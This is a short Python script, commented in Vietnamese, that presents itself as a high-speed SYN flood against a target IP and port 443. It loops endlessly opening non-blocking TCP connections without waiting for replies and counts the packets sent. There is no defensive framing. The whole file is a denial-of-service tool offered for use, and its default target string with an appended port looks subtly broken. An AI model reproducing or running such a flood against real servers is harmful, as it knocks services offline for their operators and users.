import socket
import sys
import time

target_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.10:8000"
target_port = 443

print(f"[*] Bắt đầu Tốc độ cao SYN Flood vào {target_ip}:{target_port}...")

packet_count = 0
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 0))  # BÍ KÍP 1: Ép OS tạo Port nguồn ngẫu nhiên liên tục
        s.setblocking(False) # BÍ KÍP 2: Non-blocking. Chỉ ném SYN đi rồi chạy, không đứng chờ Server trả lời!
        
        try:
            s.connect((target_ip, target_port))
        except BlockingIOError:
            # Non-blocking connect luôn ném ra lỗi này, bỏ qua nó!
            pass 
        except Exception:
            pass
            
        packet_count += 1
        if packet_count % 10000 == 0:
            print(f"[-] Đã bắn {packet_count} gói SYN cực tốc...")
    except Exception:
        pass